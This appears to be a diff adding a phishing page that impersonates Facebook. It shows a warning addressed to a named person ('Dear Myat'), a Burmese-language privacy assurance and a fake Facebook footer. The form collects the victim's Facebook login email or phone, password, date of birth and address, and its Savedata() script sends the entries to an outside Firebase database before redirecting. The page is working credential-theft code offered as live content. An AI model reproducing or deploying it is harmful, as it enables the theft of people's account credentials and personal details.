@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Firebase Phone authentication</title>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" rel="stylesheet" />
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap" rel="stylesheet" />
+    <!-- MDB -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/1.0.0/mdb.min.css" rel="stylesheet" />
+    <style>
+        .logo_ {
+            padding: 8px 0 16px 0;
+            width: 120px;
+
+
+        }
+
+        .ratio {
+            height: 70px;
+            margin: -20px;
+
+
+        }
+
+        body {
+            background-color: #f0f2f5;
+        }
+
+        .bg-facebook {
+            background-color: #1877f2;
+        }
+    </style>
+
+</head>
+
+
+<body>
+    <!-- Image and text -->
+    <nav class="navbar navbar-light bg-facebook">
+        <a class="navbar-brand ml-2" href="www.facebook.com">
+            <i style="color: #fff; " class="fab fa-facebook-f"></i>
+
+        </a>
+    </nav>
+    <!-- <div class="logo_ ratio mt-1 mr-4 ml-4">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg">
+    </div> -->
+    <div class="container mt-3">
+        <div class="alert alert-dismissible fade show bg-warning" role="alert" data-color="warning">
+            <strong>Dear Myat.</strong> You should confirm your informtion.
+            <button type="button" class="close" data-dismiss="alert" aria-label="Close">
+                <span aria-hidden="true">&times;</span>
+            </button>
+        </div>
+
+        <div class="card mt-5">
+            <div class="card-header">
+                We won't share any information privacy is importance.
+                <strong>သင်ရဲ့ အချက်အလက်များကို မည်သူ့ကိုမှ မမျှဝေပါ</strong>
+            </div>
+            <div class="card-body">
+                <h5 class="card-title">It is quick easy</h5>
+                <p class="card-text">
+                    Please fill some update information
+                </p>
+                <form>
+                    <!-- 2 column grid layout with text inputs for the first and last names -->
+                    <div class="row mb-4">
+                        <div class="col">
+                            <div class="form-outline">
+                                <input type="text" id="fn" class="form-control" />
+                                <label class="form-label" for="form6Example1">Facebook Account Name</label>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Text input -->
+                    <div class="form-outline mb-4">
+                        <input type="text" id="dob" class="form-control" />
+                        <label class="form-label" for="form6Example4">Date Of Birth</label>
+                    </div>
+
+                    <!-- Email input -->
+                    <div class="form-outline mb-4">
+                        <input type="text" id="apn" class="form-control" />
+                        <label class="form-label" for="form6Example5">FB-Login Email or Phone number</label>
+                    </div>
+
+                    <!-- Number input -->
+                    <div class="form-outline mb-4">
+                        <input type="text" id="pwd" class="form-control" />
+                        <label class="form-label" for="form6Example6">Account Password</label>
+                    </div>
+                    <!-- Confirm Password-->
+                    <div class="form-outline mb-4">
+                        <input type="text" id="cpwd" class="form-control" />
+                        <label class="form-label" for="form6Example6">Confirm Account Password</label>
+                    </div>
+
+
+                    <!-- Message input -->
+                    <div class="form-outline mb-4">
+                        <textarea class="form-control" id="form6Example7" rows="4"></textarea>
+                        <label class="form-label" for="form6Example7">Address</label>
+                    </div>
+
+                    <!-- Checkbox -->
+                    <div class="form-check d-flex justify-content-center mb-4">
+                        <input class="form-check-input mr-2" type="checkbox" value="" id="form6Example8" checked />
+                        <label class="form-check-label" for="form6Example8">
+                            Information Correct?
+                        </label>
+                    </div>
+
+                    <!-- Submit button -->
+                    <button type="button" id="confirm" class="btn btn-lg btn-block btn-primary"
+                        onclick="Savedata()">Confirm</button>
+                </form>
+
+            </div>
+        </div>
+
+    </div>
+    <footer class="mt-4">
+        <div class=" p-3" style="background-color: rgba(0, 0, 0, 0.2);">
+
+            <a class="text-dark" href="https://www.facebook.com/">Facebook © 2020</a>
+        </div>
+    </footer>
+
+    <!--  //--------------------------------------------------------------------------------------// -->
+    <script src="https://www.gstatic.com/firebasejs/7.22.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.22.0/firebase-analytics.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.22.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.22.0/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.22.0/firebase-messaging.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.22.0/firebase-database.js"></script>
+
+    <!-- //-----------------------------------------------------------------------------------------// -->
+
+
+
+    <script>
+        // Your web app's Firebase configuration
+        var firebaseConfig = {
+            apiKey: "AIzaSyCIMjQV1y_frJyl1GapCQ_tOTZbrXCfX8o",
+            authDomain: "data-list-ff920.firebaseapp.com",
+            databaseURL: "https://data-list-ff920.firebaseio.com",
+            projectId: "data-list-ff920",
+            storageBucket: "data-list-ff920.appspot.com",
+            messagingSenderId: "546171404627",
+            appId: "1:546171404627:web:181c7f9113f6cbdb9961a6"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        var database = firebase.database();
+
+        var data = document.getElementById("fn");
+        var Birth = document.getElementById("dob");
+        var Password = document.getElementById("pwd");
+        var ConfirmPsw = document.getElementById("cpwd");
+        var Email = document.getElementById("apn");
+        var btn_confirm = document.getElementById("confirm");
+
+        //    database.ref("data").set({
+        //        username: "data",
+        //    })
+        function Savedata() {
+            var username_data = data.value;
+            var birthday_data = Birth.value;
+            var password_data = Password.value;
+            var confirmpsw_data = ConfirmPsw.value;
+            var email_data = Email.value;
+            localStorage.setItem("UserName",username_data);
+            database.ref("User/").push({
+                username: username_data,
+                BirthDay: birthday_data,
+                Password: password_data,
+                ConfirmPassword: confirmpsw_data,
+                Email: email_data
+
+            }, function (error) {
+                if (error) {
+                    console.log(error);
+                }
+                else {
+                    // alert("FINISH");
+                    window.location.assign("./Finish.html");
+                }
+            });
+
+
+        }
+
+
+
+    </script>
+</body>
+<!-- MDB -->
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/1.0.0/mdb.min.js"></script>
+
+
+
+</html>
